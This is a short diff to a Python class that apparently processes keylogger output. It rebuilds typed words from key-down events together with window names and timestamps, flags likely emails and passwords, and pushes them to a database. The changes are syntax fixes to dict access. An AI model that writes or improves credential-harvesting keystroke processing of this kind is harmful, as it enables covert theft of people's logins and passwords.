@@ -6,9 +6,9 @@ class Process:
     
     def Payload(self,key):
         res = {
-            "datetime": key.datetime,
-            "epoch": key.epoch,
-            "windowName": key.windowName,
+            "datetime": key['datetime'],
+            "epoch": key['epoch'],
+            "windowName": key['windowName'],
             "processedWord":"",
             "isEmail": 0,
             "isPassword": 0
@@ -17,21 +17,21 @@ class Process:
     
     def separateBreakChar(self,data):
     #loop through items in log and append characters on key-down
-        if (data.processedKey):
-            if (len(words) == 0):
-                currWord = Payload(key)
-            words += key.processedKey
+        if (data['processedKey']):
+            if (len(self.words) == 0):
+                currWord = self.Payload(data)
+            self.words += data['processedKey']
         else:
-            currWord.processedWord = words
-            print("words: "+words)
+            currWord['processedWord'] = self.words
+            print("words: "+ self.words)
             self.checkEmailPassword(currWord)
             self.pushDB(currWord)
-            words = []
+            self.words = ""
         return 0
                 
     def checkEmailPassword(self,payload):
     #check the processedWord of the payload to determine if possible email or password
-        word = payload.processedWord
+        word = payload['processedWord']
         if "@" in word:
             payload.isEmail = 1
         
